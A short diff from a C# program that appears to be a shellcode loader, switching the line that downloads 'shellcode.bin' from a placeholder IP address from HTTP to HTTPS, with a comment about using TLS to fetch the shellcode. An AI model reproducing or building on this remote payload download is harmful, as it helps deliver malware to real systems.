@@ -160,7 +160,7 @@ public class Program
 
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13; //Use TLS to download shellcode
 
-            shellcode = client.DownloadData("http://X.X.X.X/shellcode.bin");
+            shellcode = client.DownloadData("https://X.X.X.X/shellcode.bin");
         }
 
 
